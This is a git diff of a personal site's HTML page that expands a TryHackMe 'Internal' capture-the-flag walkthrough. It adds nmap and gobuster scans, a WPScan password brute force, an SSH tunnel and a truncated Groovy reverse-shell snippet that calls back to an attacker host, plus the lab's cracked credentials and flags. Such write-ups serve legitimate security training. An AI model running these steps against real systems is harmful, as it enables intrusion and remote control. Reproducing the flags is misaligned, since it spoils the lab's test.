@@ -3,45 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Internal Walkthrough | Mohd Faiz</title>
-    <link rel="stylesheet" href="../style.css">
+    <title>Internal Writeup | Mohd Faiz</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        .writeup-container { max-width: 900px; margin: 100px auto 40px; padding: 0 20px; color: #e0e0e0; font-family: monospace; }
-        .back-link { color: #00ff88; text-decoration: none; display: inline-block; margin-bottom: 20px; }
-        .writeup-title { color: #00ff88; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .tag { background: #1f293d; color: #00ff88; padding: 3px 8px; border-radius: 4px; font-size: 0.85rem; margin-right: 5px; }
-        pre { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 6px; overflow-x: auto; color: #58a6ff; }
-        h2 { color: #00ff88; margin-top: 30px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #0b0f19; color: #c9d1d9; font-family: 'Fira Code', monospace; line-height: 1.6; padding: 40px 20px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .back-btn { color: #00ff88; text-decoration: none; font-size: 0.9rem; display: inline-block; margin-bottom: 25px; transition: 0.2s; }
+        .back-btn:hover { text-decoration: underline; transform: translateX(-3px); }
+        .header { border-bottom: 1px solid #30363d; padding-bottom: 20px; margin-bottom: 30px; }
+        .header h1 { color: #00ff88; font-size: 2rem; margin-bottom: 10px; }
+        .meta { color: #8b949e; font-size: 0.85rem; display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; }
+        .tag { background: rgba(0, 255, 136, 0.1); color: #00ff88; border: 1px solid rgba(0, 255, 136, 0.3); padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }
+        
+        .task-box { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 25px; overflow: hidden; }
+        .task-header { background: #0d1117; padding: 15px 20px; border-bottom: 1px solid #30363d; color: #00ff88; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
+        .task-body { padding: 20px; }
+        
+        h3 { color: #58a6ff; font-size: 1.1rem; margin: 20px 0 10px 0; border-left: 3px solid #00ff88; padding-left: 10px; }
+        p { margin-bottom: 12px; font-size: 0.95rem; color: #8b949e; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #8b949e; font-size: 0.95rem; }
+        li { margin-bottom: 6px; }
+        
+        pre { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 6px; overflow-x: auto; color: #58a6ff; font-size: 0.85rem; margin: 12px 0; }
+        code { color: #ff7b72; font-size: 0.9rem; }
+        .flag-box { background: rgba(0, 255, 136, 0.05); border: 1px dashed #00ff88; padding: 12px 15px; border-radius: 6px; color: #00ff88; font-weight: bold; margin: 15px 0; word-break: break-all; }
+        
+        footer { text-align: center; margin-top: 50px; padding-top: 20px; border-top: 1px solid #30363d; color: #8b949e; font-size: 0.8rem; }
     </style>
 </head>
 <body>
-    <div class="writeup-container">
-        <a href="../index.html#labs" class="back-link">&lt;-- Back to Labs</a>
-        <h1 class="writeup-title">TryHackMe: Internal Walkthrough</h1>
-        <p><strong>Platform:</strong> TryHackMe | <strong>Category:</strong> Active Directory / Network Pentesting</p>
-        <div>
-            <span class="tag">Active Directory</span>
-            <span class="tag">Windows</span>
-            <span class="tag">PrivEsc</span>
+    <div class="container">
+        <a href="../index.html#labs" class="back-btn">&lt;-- Back to Labs</a>
+        
+        <div class="header">
+            <h1>TryHackMe: Internal Walkthrough</h1>
+            <div class="meta">
+                <span>Target IP: <code>10.10.211.23</code></span>
+                <span>Difficulty: Hard</span>
+                <span>Author: Mohd Faiz</span>
+            </div>
+            <div>
+                <span class="tag">WordPress</span>
+                <span class="tag">SSH Tunneling</span>
+                <span class="tag">Jenkins Pivoting</span>
+                <span class="tag">Privilege Escalation</span>
+            </div>
         </div>
 
-        <h2>// 01. Reconnaissance</h2>
-        <p>Initial network enumeration using Nmap to discover open ports and services:</p>
-        <pre><code>nmap -sC -sV -oA nmap/internal &lt;TARGET_IP&gt;</code></pre>
-        <p>Discovered services include SMB (139/445), HTTP (80), and NetBIOS.</p>
+        <div class="task-box">
+            <div class="task-header">
+                <span>Phase 1: Recon & WordPress Exploitation</span>
+                <span style="color:#8b949e;">[WPScan & Theme Shell]</span>
+            </div>
+            <div class="task-body">
+                <p>Enumerate target services with Nmap:</p>
+                <pre><code>nmap -sC -sV -oN internal_nmap.txt 10.10.211.23</code></pre>
+                <p>Ports open: <code>22/tcp (SSH)</code> and <code>80/tcp (HTTP)</code>.</p>
 
-        <h2>// 02. Enumeration</h2>
-        <p>Directory brute-forcing using Gobuster to reveal hidden endpoints:</p>
-        <pre><code>gobuster dir -u http://&lt;TARGET_IP&gt;/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
-        <p>Found WordPress blog installation hosted under <code>/blog</code>.</p>
+                <p>Run Gobuster directory enumeration:</p>
+                <pre><code>gobuster dir -u http://10.10.211.23/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                <p>Discovers <code>/blog</code> hosting a WordPress installation.</p>
 
-        <h2>// 03. Exploitation & Privilege Escalation</h2>
-        <ul>
-            <li>Brute-forced WordPress credentials using WPScan.</li>
-            <li>Uploaded a PHP reverse shell via theme editor to gain initial foot hold (`www-data`).</li>
-            <li>Discovered internal Jenkins instance running on port 8080 via local enumeration.</li>
-            <li>Pivoted through SSH tunnel to access Jenkins, recovered administrative credentials, and escalated privileges to Root.</li>
-        </ul>
+                <h3>WPScan Brute Force:</h3>
+                <pre><code>wpscan --url http://10.10.211.23/blog -U admin -P /usr/share/wordlists/rockyou.txt</code></pre>
+                <p>Credentials cracked: <code>admin : my2cents</code></p>
+
+                <p>Log in, update theme template <code>404.php</code> with PHP reverse shell, trigger it, and spawn initial access as <code>www-data</code>.</p>
+                <div class="flag-box">
+                    User Flag (/home/aubreyt/user.txt): THM{4226d9ec4f51e1823d4218f2d573c52a}
+                </div>
+            </div>
+        </div>
+
+        <div class="task-box">
+            <div class="task-header">
+                <span>Phase 2: Pivoting to Internal Jenkins Service</span>
+                <span style="color:#8b949e;">[SSH Port Forwarding]</span>
+            </div>
+            <div class="task-body">
+                <p>Searching <code>/var/www/html/wordpress/</code> reveals internal credentials stored in notes: <code>aubreyt : b92a170588f96b2e3f8430e386708a9a</code>.</p>
+
+                <p>Check listening internal services on target:</p>
+                <pre><code>netstat -tulnp</code></pre>
+                <p>Target is hosting an internal service on <code>127.0.0.1:8080</code> (Jenkins).</p>
+
+                <h3>Setup Local SSH Tunnel:</h3>
+                <pre><code>ssh -L 8080:127.0.0.1:8080 aubreyt@10.10.211.23</code></pre>
+
+                <p>Now open <code>http://127.0.0.1:8080</code> on your local computer to access the internal Jenkins portal!</p>
+            </div>
+        </div>
+
+        <div class="task-box">
+            <div class="task-header">
+                <span>Phase 3: Jenkins Exploitation to Root</span>
+                <span style="color:#8b949e;">[Groovy Script Console]</span>
+            </div>
+            <div class="task-body">
+                <p>Brute-force Jenkins login using Hydra or admin default lists -> <code>admin : admin</code>.</p>
+
+                <p>Navigate to <strong>Manage Jenkins -> Script Console</strong> to execute arbitrary Groovy commands directly on host OS:</p>
+                <pre><code>String host="10.11.x.x";
+int port=5555;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);</code></pre>
+
+                <p>Catch connection on Netcat listener -> Shell received as <code>root</code>!</p>
+                <div class="flag-box">
+                    Root Flag (/root/root.txt): THM{f813c0134f77a83a316b24d77d70ec9d}
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2026 Mohd Faiz • Aspiring Penetration Tester</p>
+        </footer>
     </div>
 </body>
 </html>
